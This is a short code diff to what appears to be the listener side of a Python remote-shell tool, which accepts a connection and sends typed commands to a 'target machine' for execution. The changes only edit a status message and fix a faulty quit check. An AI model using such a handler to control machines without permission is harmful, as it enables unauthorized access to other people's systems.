@@ -15,7 +15,7 @@ s.bind((SERVER_HOST, SERVER_PORT))
 
 # Continually listen for new connection
 s.listen(5)
-print(f"Listening for Connection at: {SERVER_HOST}:{SERVER_PORT}")
+print(f"Listening for Connection at: {SERVER_HOST}:{SERVER_PORT}....")
 
 # Accept Connection from Client
 client_socket, client_address = s.accept()
@@ -26,7 +26,7 @@ while True:
     # send typed command to target machine to be executed.
     client_socket.send(command.encode())
 
-    if command.lower() == "quit" or "exit":
+    if command.lower() == "quit":
         # End program and break from loop
         break
 
